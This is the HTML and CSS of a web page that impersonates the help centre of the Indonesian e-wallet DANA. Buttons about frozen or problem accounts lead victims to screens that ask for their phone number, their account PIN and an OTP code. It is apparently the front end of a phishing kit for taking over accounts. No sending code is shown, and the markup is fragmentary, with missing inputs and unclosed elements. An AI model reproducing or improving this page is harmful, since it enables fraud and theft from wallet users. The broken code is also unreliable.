<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- ✅ JUDUL & SAMBUNGAN -->
    <title>Pusat Bantuan DANA</title>
    <meta name="theme-color" content="#0086e6">
    <meta property="og:title" content="Pusat Bantuan DANA">
    <meta property="og:description" content="DIANA - DANA Digital Assistant siap bantu kendala akun Anda 24/7">
    <meta property="og:image" content="images (2) (24).jpeg">
    <meta property="og:url" content="https://nama-akun.github.io/nama-folder/">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = { theme: { extend: { colors: { dana: '#0086e6' } } } }
    </script>
    <style type="text/tailwindcss">
        @layer utilities { .bg-dana { background-color: #0086e6; } .text-dana { color: #0086e6; } }
    </style>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background:#f4f7fa; overflow: hidden; }
        .max-w-md { max-width: 480px; margin: 0 auto; position: relative; height: 100vh; }
        .halaman { position: absolute; top: 0; left: 0; width: 100%; height: 100vh; overflow: hidden; z-index: 1; }
        .hilang { display: none !important; }

        /* ✅ LOGO DANA */
        .logo-kiri-atas {
            position: absolute;
            top: 15px;
            left: 15px;
            width: 42px;
            height: 42px;
            border-radius: 6px;
            z-index: 10;
        }
        .logo-tengah {
            width: 75px;
            height: auto;
            margin-bottom: 40px;
            margin-top: 10px;
        }

        /* ✅ ANIMASI 3D */
        .header-3d-wrapper {
            width: 100%;
            height: 340px;
            background: linear-gradient(135deg, #0086e6, #0056b3);
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
            padding: 20px 0;
        }
        .carousel-3d-container {
            width: 300px;
            height: 180px;
            position: relative;
            perspective: 1000px;
        }
        .carousel-3d-spinner {
            width: 100%;
            height: 100%;
            position: absolute;
            transform-style: preserve-3d;
            animation: spin3D 20s infinite linear;
        }
        .carousel-3d-spinner:hover, .carousel-3d-spinner:active { animation-play-state: paused; }
        .carousel-3d-item {
            position: absolute;
            width: 280px;
            height: 160px;
            left: 10px;
            top: 10px;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
        }
        .carousel-3d-item img { width: 100%; height: 100%; object-fit: cover; }
        .carousel-3d-item:nth-child(1) { transform: rotateY(0deg) translateZ(250px); }
        .carousel-3d-item:nth-child(2) { transform: rotateY(72deg) translateZ(250px); }
        .carousel-3d-item:nth-child(3) { transform: rotateY(144deg) translateZ(250px); }
        .carousel-3d-item:nth-child(4) { transform: rotateY(216deg) translateZ(250px); }
        .carousel-3d-item:nth-child(5) { transform: rotateY(288deg) translateZ(250px); }
        @keyframes spin3D { from { transform: rotateY(0deg); } to { transform: rotateY(360deg); } }
        @media (max-width: 480px) {
            .header-3d-wrapper { height: 260px; }
            .carousel-3d-container { width: 200px; height: 120px; }
            .carousel-3d-item { width: 190px; height: 110px; }
            .carousel-3d-item:nth-child(1) { transform: rotateY(0deg) translateZ(160px); }
            .carousel-3d-item:nth-child(2) { transform: rotateY(72deg) translateZ(160px); }
            .carousel-3d-item:nth-child(3) { transform: rotateY(144deg) translateZ(160px); }
            .carousel-3d-item:nth-child(4) { transform: rotateY(216deg) translateZ(160px); }
            .carousel-3d-item:nth-child(5) { transform: rotateY(288deg) translateZ(160px); }
        }

        /* ✅ NAVIGASI BAWAH */
        .nav-baru {
            position: absolute;
            bottom: 0;
            width: 100%;
            height: 75px;
            background-image: url('1704436332522 (1).png');
            background-size: 100% 100%;
            background-repeat: no-repeat;
            display: flex;
            justify-content: space-around;
            align-items: center;
            z-index: 10;
        }
        .nav-baru div { width: 20%; height: 100%; }

        /* ✅ ANIMASI LOADING */
        .loading-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: #0086e6;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .wadah-loading { position: relative; }
        .logo-loading { width: 70px; height: 70px; border-radius: 8px; position: relative; z-index: 2; }
        .cincin-loading {
            position: absolute;
            top: 50%; left: 50%;
            width: 110px; height: 110px;
            margin-top: -55px; margin-left: -55px;
            background-image: url('IMG-20260524-WA0060.jpg');
            background-size: contain;
            background-repeat: no-repeat;
            animation: putar 1s linear infinite;
            z-index: 1;
        }
        @keyframes putar { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }


        /* ====================================== */
        /* ✅ HALAMAN NOMOR */
        /* ====================================== */
        #nomor { background-color: #0086e6; color: white; padding: 40px 25px; }
        .judul-nomor { font-size: 17px; margin-bottom: 35px; font-weight: normal; color: white; text-align: center; }
        
        .kotak-input-nomor {
            width: 100%;
            background-color: white;
            border-radius: 12px;
            display: flex;
            align-items: center;
            padding: 12px 15px;
            margin-bottom: 20px;
        }
        .bendera-id { width: 24px; height: 16px; margin-right: 10px; }
        .kode-negara { color: #333; font-weight: bold; margin-right: 8px; font-size: 16px; }
        .input-nomor { flex: 1; border: none; outline: none; font-size: 16px; color: #333; background: transparent; }
        
        .teks-syarat { font-size: 13px; text-align: center; line-height: 1.5; margin-bottom: 60px; color: white; opacity: 0.9; }
        .tombol-lanjut-nomor {
            position: absolute;
            bottom: 50px;
            color: white;
            font-size: 17px;
            font-weight: 500;
            background: transparent;
            border: none;
            cursor: pointer;
            left: 50%;
            transform: translateX(-50%);
        }


        /* ====================================== */
        /* ✅ HALAMAN PIN */
        /* ====================================== */
        #pin { background-color: #0086e6; color: white; padding: 30px 25px; }
        .tombol-kembali { position: absolute; top: 20px; left: 20px; color: white; font-size: 22px; text-decoration: none; z-index: 10; }
        .judul-pin { text-align: center; font-size: 17px; margin-bottom: 40px; font-weight: normal; color: white; }
        .kotak-pin-baris { display: flex; justify-content: center; gap: 12px; margin-bottom: 25px; }
        .kotak-pin {
            width: 50px; height: 55px;
            background-color: white;
            border-radius: 8px;
            position: relative;
        }
        .kotak-pin.aktif::after {
            content: '';
            position: absolute;
            left: 50%; top: 12px;
            width: 2px; height: 20px;
            background-color: #999;
            animation: kedip 1s infinite;
        }
        @keyframes kedip { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
        .tombol-tampilkan {
            display: block;
            margin: 0 auto 30px auto;
            background-color: transparent;
            border: 1px solid white;
            color: white;
            padding: 6px 18px;
            border-radius: 20px;
            font-size: 14px;
        }
        .lupa-pin { text-align: center; font-size: 15px; color: white; opacity: 0.9; margin-bottom: 60px; }
        .ikon-bawah-pin {
            position: absolute;
            bottom: 90px; left: 50%; transform: translateX(-50%);
            width: 50px; height: 50px;
            background-color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .ikon-bawah-pin svg { width: 24px; height: 24px; fill: #0086e6; }

        /* KEYBOARD PIN */
        .keyboard-pin {
            position: absolute;
            bottom: 80px;
            width: 100%;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            padding: 0 30px;
        }
        .tombol-angka {
            width: 55px; height: 55px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            color: white;
            cursor: pointer;
            border: none;
            background: transparent;
            margin: 0 auto;
        }
        .tombol-angka:active { background-color: rgba(255,255,255,0.15); }


        /* ====================================== */
        /* ✅ HALAMAN OTP */
        /* ====================================== */
        #otp { background-color: white; color: #333; }
        .header-otp { background-color: #0086e6; color: white; padding: 15px 20px; position: relative; text-align: center; font-weight: 500; font-size: 17px; }
        .kembali-otp { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: white; font-size: 20px; text-decoration: none; }
        .isi-otp { padding: 30px 25px; }
        .teks-atas-otp { font-size: 15px; margin-bottom: 15px; color: #333; }
        .kotak-nomor-otp {
            display: flex;
            align-items: center;
            background-color: #f1f1f1;
            border-radius: 8px;
            padding: 10px 12px;
            margin-bottom: 8px;
        }
        .via-wa { font-size: 13px; color: #666; margin-bottom: 5px; margin-left: 32px; display: flex; align-items: center; gap: 5px; }
        .peringatan-otp {
            font-size: 13px;
            color: #e74c3c;
            text-align: center;
            margin-bottom: 20px;
            font-weight: 500;
        }
        .kotak-otp-baris { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
        .kotak-otp {
            width: 45px; height: 50px;
            border: 1px solid #ccc;
            border-radius: 6px;
            text-align: center;
            font-size: 20px;
            outline: none;
        }
        .kotak-otp.aktif { border-color: #0086e6; }
        .nomor-tidak-aktif { text-align: center; font-size: 14px; color: #0086e6; margin-bottom: 25px; cursor: pointer; }
        .kotak-kirim-ulang { display: flex; align-items: center; justify-content: center; gap: 8px; }
        .tombol-kirim-ulang {
            background-color: #eee;
            border: none;
            padding: 8px 20px;
            border-radius: 6px;
            color: #999;
            font-size: 14px;
            cursor: not-allowed;
        }
        .timer-otp {
            background-color: #eee;
            width: 35px; height: 35px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: #666;
        }

        /* ✅ TOMBOL HALAMAN UTAMA */
        .wadah-tombol { position: relative; z-index: 15; pointer-events: auto !important; }
    </style>
</head>
<body>
    <div class="max-w-md">

        <!-- ============= HALAMAN UTAMA ============= -->
        <div id="utama" class="halaman bg-dana">
            <img src="IMG-20260524-WA0059.jpg" alt="DANA" class="logo-kiri-atas">

            <div class="header-3d-wrapper">
                <div class="carousel-3d-container">
                    <div class="carousel-3d-spinner">
                        <div class="carousel-3d-item"><img src="promo dana .jpeg" alt="Promo Dana"></div>
                        <div class="carousel-3d-item"><img src="DANA.png" alt="DANA QRIS"></div>
                        <div class="carousel-3d-item"><img src="playleter.jpg" alt="DANA Paylater"></div>
                        <div class="carousel-3d-item"><img src="DANA-Cicil.jpg" alt="DANA Cicil"></div>
                        <div class="carousel-3d-item"><img src="promo hadiah.png" alt="Promo Hadiah"></div>
                    </div>
                </div>

                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">PULIHKAN AKUN DI BEKUKAN</button>

                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">LAPORAN KENDALA AKUN</button>
                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold shadow-md">KENDALA LAINNYA</button>

            <div class="nav-baru"></div>
        </div>


        <!-- ============= HALAMAN NOMOR ============= -->
        <div id="nomor" class="halaman hilang">
            <img src="IMG-20260524-WA0059.jpg" alt="DANA" class="logo-kiri-atas">
            <img src="IMG-20260524-WA0059.jpg" alt="Logo DANA" class="logo-tengah">

            <p class="judul-nomor">Masukan nomor HP kamu</p>

            <div class="kotak-input-nomor">
                <img src="images (20).png" alt="ID" class="bendera-id">
                <span class="kode-negara">+62</span>

            <p class="teks-syarat">

            </p>

            <button class="tombol-lanjut-nomor" onclick="prosesKePin()">LANJUT</button>
        </div>


        <!-- ✅ LOADING 1: NOMOR ➝ PIN -->
        <div id="loading1" class="loading-overlay hilang">
            <div class="wadah-loading">
                <div class="cincin-loading"></div>
                <img src="IMG-20260524-WA0059.jpg" alt="Loading" class="logo-loading">

        <div id="pin" class="halaman hilang">

                <button class="tombol-angka" id="hapusPin">⌫</button>
            </div>
        </div>

            <div class="wadah-loading">
                <div class="cincin-loading"></div>
                <img src="IMG-20260524-WA0059.jpg" alt="Loading" class="logo-loading">
            </div>
        </div>
